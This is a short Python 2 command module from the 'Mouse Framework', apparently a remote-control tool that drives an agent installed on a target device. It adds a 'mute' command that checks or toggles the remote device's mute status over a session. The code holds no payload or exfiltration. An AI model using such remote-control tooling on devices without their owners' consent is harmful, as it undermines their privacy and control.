#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h

class command:
    def __init__(self):
        self.name = "mute"
        self.description = "Update and show mute status."
        self.usage = "Usage: mute [status|on|off]"
    
    def run(self,session,cmd_data):
       	if not cmd_data['args'] or not cmd_data['args'] in ['status','on','off']:
       		print self.usage
       		return
       	if cmd_data['args'] == "status":
       		cmd_data = {'cmd':'ismuted','args':''}
       	elif cmd_data['args'] == "off":
       		cmd_data = {'cmd':'unmute','args':''}
        elif cmd_data['args'] == "on":
            cmd_data = {'cmd':'mute','args':''}
        error = session.send_command(cmd_data)
        if error:
        	print(h.RED+"[-]"+h.WHITE+" Mouse Substrate is not installed!")
